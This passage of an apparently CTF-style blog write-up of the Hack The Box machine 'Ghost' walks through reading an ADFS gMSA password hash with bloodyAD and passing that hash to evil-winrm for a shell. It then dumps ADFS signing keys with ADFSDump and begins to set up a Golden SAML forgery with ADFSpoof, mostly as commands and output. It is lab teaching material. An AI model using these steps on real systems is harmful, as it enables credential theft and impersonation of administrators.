        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AttributeValue</span><span class="token punctuation">></span></span>justin.bradley<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AttributeValue</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Attribute</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AttributeStatement</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AuthnStatement</span> <span class="token attr-name">AuthnInstant</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>2025-05-21T13:44:32.525Z<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AuthnContext</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AuthnContextClassRef</span><span class="token punctuation">></span></span>urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AuthnContextClassRef</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AuthnContext</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>AuthnStatement</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Assertion</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token namespace">samlp:</span>Response</span><span class="token punctuation">></span></span></span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7802bac66eb14f5d83b6f" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><em class="SemanticString__Fragment SemanticString__Fragment--Italic">Steps 6 and 7 — SP validation and authorization</em></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780d5b577d4923970b940" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The SAML response is then forwarded to Ghost Core for validation. Here, the application successfully identifies me as </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">justin.bradley</code></span><span class="SemanticString">, but rejects my authorization request since I’m not the admin. As a result, it redirects me to the unauthorized page seen above.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78041b76af2360fc59370" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_saml_auth.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/core_saml_auth.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f780819a96c296ddfe5ecb" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">In this implementation, Ghost Core does not need to handle authentication directly. Instead, it simply inspects the SAML response — like verifying a person’s ID card — and decides whether to grant access to the application.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f78080aaa2c0b584d31db7" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The SAML response is digitally signed, making it secure and tamper-resistant under normal circumstances. However, Justin has </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">ReadGMSAPassword</code></span><span class="SemanticString"> on ADFS’ service account, which can potentially be leveraged to extract the signing key and forge an admin SAML response.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780859da1f83f8ff692cb" class="Image Image--PageWidth"><figure><a href="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_justin_readgmsa.png?raw=true"><img src="https://github.com/ch3ng625/blog_images/blob/main/ghost/bh_justin_readgmsa.png?raw=true" style="width:100%"/></a><figcaption><span class="SemanticStringArray"></span></figcaption></figure></div><div id="https://www.notion.so/1fe0b98a88f78019ba32cc0c8be57973" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f780fba42af171ad1cc9ac" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">DACL Abuse — </strong></span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">ReadGMSAPassword</strong></code></span><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780b3b641fb4590e4f3af" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">According to </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://bloodhound.specterops.io/resources/edges/read-gmsa-password">BloodHound</a></span><span class="SemanticString">:</span></span></p></div><blockquote id="https://www.notion.so/1fe0b98a88f780b0b896c56e522f2769" class="ColorfulBlock ColorfulBlock--ColorDefault Quote"><span class="SemanticStringArray"><span class="SemanticString">This privilege allows you to read the password for a Group Managed Service Account (GMSA). Group Managed Service Accounts are a special type of Active Directory object, where the password for that object is managed by and automatically changed by Domain Controllers on a set interval.</span></span></blockquote><div id="https://www.notion.so/1fe0b98a88f7803294bbc6ee00011b5e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">As shown in </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword">this page</a></span><span class="SemanticString">, I can use </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">bloodyAD</code></span><span class="SemanticString"> to read the account’s </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">msDS-ManagedPassword</code></span><span class="SemanticString"> attribute, which contains its NTLM hash.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f7808eaef9f75ead510d9a" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> bloodyAD --host dc01.ghost.htb -d ghost.htb -u &#x27;justin.bradley&#x27; -p &#x27;Qwertyuiop1234$$&#x27; get object &#x27;ADFS_GMSA$&#x27; --attr msDS-ManagedPassword

distinguishedName: CN=adfs_gmsa,CN=Managed Service Accounts,DC=ghost,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:abf1d5a64837f8722b61e93a292d09dd
msDS-ManagedPassword.B64ENCODED: UzggNwoF2V3JR3hxgyXr7hMtsz+vPrdN4e6j32YaknjyQRIO/tl9QbpM7NDMXTwZ/lOoEZbzqZj4147uTuu+CKvwmTQOcfpshJxcPJeAQrG72hB9I4DtDDPaeiixcGaiH7BDld0xXxK++2Z5+lBbi9PnhaTSLXX7Uq4gHY6PDzzuFB1QLpyhBRo4SHskKJKX824R0NZK9szIfTvaFnWLsIUe4F4dhMOaA0UCugirlspWp2vi+ePNhgRy+Ly2/lHIThu3nOVWYnA2xXYRp85sy3uP0EHeTbs6pLNnd2NLOf8c7qTu+4MKik5+8B7OwMnamCejwuO1P5bx8OIhdYUq6A==</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7801fa89cf5fdb6b59a09" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Conveniently, the account has access to WinRM, and I can use the hash directly to get a shell via </span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">evil-winrm</code></span><span class="SemanticString">.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f78030a45bc4356db5e664" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> evil-winrm -u &#x27;ADFS_GMSA$&#x27; -H abf1d5a64837f8722b61e93a292d09dd -i ghost.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt;</span></mark></span><span class="SemanticString"><span> whoami

ghost\adfs_gmsa$</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7801fbf46c16b043f10b2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"></span></p></div><div id="https://www.notion.so/1fe0b98a88f7805790e7dc825c318c77" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><strong class="SemanticString__Fragment SemanticString__Fragment--Bold">Golden SAML Attack:</strong></span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780b284d7fcdafaac4c9d" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">The act of forging SAML responses and impersonating other users is known as a </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps">Golden SAML attack</a></span><span class="SemanticString">. The name resembles another well known attack called Golden Ticket, which targets Kerberos authentication within a domain. Both attacks are similar in nature, but Golden SAML is more flexible and stealthy, as the forging can happen anywhere and not limited to within the domain.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780f2add0cedff2d6fca3" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://www.netwrix.com/golden_saml_attack.html">This post</a></span><span class="SemanticString"> has a comprehensive walkthrough of the attack. I’ll first use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/mandiant/ADFSDump">ADFSDump</a></span><span class="SemanticString"> to dump out a whole bunch of data</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780439360c16384aebf7f" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt;</span></mark></span><span class="SemanticString"><span> upload ADFSDump.exe
                                        
Info: Uploading /home/ch3ng/machines/ghost/ADFSDump.exe to C:\Users\adfs_gmsa$\Documents\ADFSDump.exe
                                        
Data: 40276 bytes of 40276 bytes copied
                                        
Info: Upload successful!

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorPurple"><span>*Evil-WinRM* PS C:\Users\adfs_gmsa$\Documents&gt;</span></mark></span><span class="SemanticString"><span> .\ADFSDump.exe

    ___    ____  ___________ ____
   /   |  / __ \/ ____/ ___// __ \__  ______ ___  ____
  / /| | / / / / /_   \__ \/ / / / / / / __ `__ \/ __ \
 / ___ |/ /_/ / __/  ___/ / /_/ / /_/ / / / / / / /_/ /
/_/  |_/_____/_/    /____/_____/\__,_/_/ /_/ /_/ .___/
                                              /_/
Created by @doughsec


## Extracting Private Key from Active Directory Store
[-] Domain is ghost.htb
[-] Private Key: FA-DB-3A-06-DD-CD-40-57-DD-41-7D-81-07-A0-F4-B3-14-FA-2B-6B-70-BB-BB-F5-28-A7-21-29-61-CB-21-C7


[-] Private Key: 8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1


## Reading Encrypted Signing Key from Database
[-] Encrypted Token Signing Key Begin
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
[-] Encrypted Token Signing Key End

[-] Certificate value: 0818F900456D4642F29C6C88D26A59E5A7749EBC
[-] Store location value: CurrentUser
[-] Store name value: My

## Reading The Issuer Identifier
[-] Issuer Identifier: http://federation.ghost.htb/adfs/services/trust
[-] Detected AD FS 2019
[-] Uncharted territory! This might not work...
## Reading Relying Party Trust Information from Database
[-]
core.ghost.htb
 ==================
    Enabled: True
    Sign-In Protocol: SAML 2.0
    Sign-In Endpoint: https://core.ghost.htb:8443/adfs/saml/postResponse
    Signature Algorithm: http://www.w3.org/2001/04/xmldsig-more#rsa-sha256
    SamlResponseSignatureType: 1;
    Identifier: https://core.ghost.htb:8443
    Access Policy: &lt;PolicyMetadata xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns=&quot;http://schemas.datacontract.org/2012/04/ADFS&quot;&gt;
  &lt;RequireFreshAuthentication&gt;false&lt;/RequireFreshAuthentication&gt;
  &lt;IssuanceAuthorizationRules&gt;
    &lt;Rule&gt;
      &lt;Conditions&gt;
        &lt;Condition i:type=&quot;AlwaysCondition&quot;&gt;
          &lt;Operator&gt;IsPresent&lt;/Operator&gt;
        &lt;/Condition&gt;
      &lt;/Conditions&gt;
    &lt;/Rule&gt;
  &lt;/IssuanceAuthorizationRules&gt;
&lt;/PolicyMetadata&gt;


    Access Policy Parameter:

    Issuance Rules: @RuleTemplate = &quot;LdapClaims&quot;
@RuleName = &quot;LdapClaims&quot;
c:[Type == &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/windowsaccountname&quot;, Issuer == &quot;AD AUTHORITY&quot;]
 =&gt; issue(store = &quot;Active Directory&quot;, types = (&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/upn&quot;, &quot;http://schemas.xmlsoap.org/claims/CommonName&quot;), query = &quot;;userPrincipalName,sAMAccountName;{0}&quot;, param = c.Value);</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7804bb1aac016c120bffd" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">What I need is the private key and the token signing key, both of which needs further reformatting. The token signing key can simply be base64 decoded, but the private key needs to be converted into binary after getting rid of all the dashes.</span></span></p></div><div id="https://www.notion.so/1fe0b98a88f780beaff4da2b122137c2" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Note that there’s 2 private keys, but only the second one works.</span></span></p></div><pre id="https://www.notion.so/1fe0b98a88f780f699bfe87ab2a41770" class="Code Code--NoWrap"><code><span class="SemanticStringArray"><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> echo &#x27;8D-AC-A4-90-70-2B-3F-D6-08-D5-BC-35-A9-84-87-56-D2-FA-3B-7B-74-13-A3-C6-2C-58-A6-F4-58-FB-9D-A1&#x27; |tr -d &#x27;-&#x27;| xxd -r -p &gt; privkey.bin

</span></span><span class="SemanticString"><mark class="SemanticString__Fragment SemanticString__Fragment--HighlightedColor SemanticString__Fragment--ColorOrange"><span>┌──(ch3ng㉿localhost)-[~/machines/ghost]
└─$</span></mark></span><span class="SemanticString"><span> cat signkey.txt | base64 -d &gt; signkey.bin</span></span></span></code></pre><div id="https://www.notion.so/1fe0b98a88f7808eb14ccd262bf1f64e" class="ColorfulBlock ColorfulBlock--ColorDefault Text"><p class="Text__Content"><span class="SemanticStringArray"><span class="SemanticString">Then I’ll use </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://github.com/mandiant/ADFSpoof">ADFSpoof</a></span><span class="SemanticString"> to forge the SAML response. In addition to the two keys, I’ll also need to provide the following arguments:</span></span></p></div><ul class="BulletedListWrapper"><li id="https://www.notion.so/1fe0b98a88f7808a94bfc7ae7010ff5c" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">-s</code></span><span class="SemanticString"> — Target domain (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">core.ghost.htb</code></span><span class="SemanticString">)</span></span></li><li id="https://www.notion.so/1fe0b98a88f78098adc5ceaf09aabf9e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--endpoint</code></span><span class="SemanticString"> — Authenticating endpoint (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">/adfs/saml/postResponse</code></span><span class="SemanticString">)</span></span></li><li id="https://www.notion.so/1fe0b98a88f78009b8d1fcfa9198018f" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--nameidformat</code></span><span class="SemanticString"> — Name identifier format in URN form, see </span><span class="SemanticString"><a class="SemanticString__Fragment SemanticString__Fragment--Link" href="https://docs.identityserver.com/saml2p/config-idp/configuring-nameId/">this page</a></span><span class="SemanticString">.</span></span></li><li id="https://www.notion.so/1fe0b98a88f780508a82fe541b5238fd" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--nameid</code></span><span class="SemanticString"> — Account to impersonate (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">GHOST\administrator</code></span><span class="SemanticString">)</span></span></li><li id="https://www.notion.so/1fe0b98a88f78012a8d0c1723bb7dd8e" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--rpidentifier</code></span><span class="SemanticString"> — Relying party (</span><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">https://core.ghost.htb:8443</code></span><span class="SemanticString">)</span></span></li><li id="https://www.notion.so/1fe0b98a88f7805082dbf663a6db27d6" class="BulletedList"><span class="SemanticStringArray"><span class="SemanticString"><code class="SemanticString__Fragment SemanticString__Fragment--Code">--assertions</code></span><span 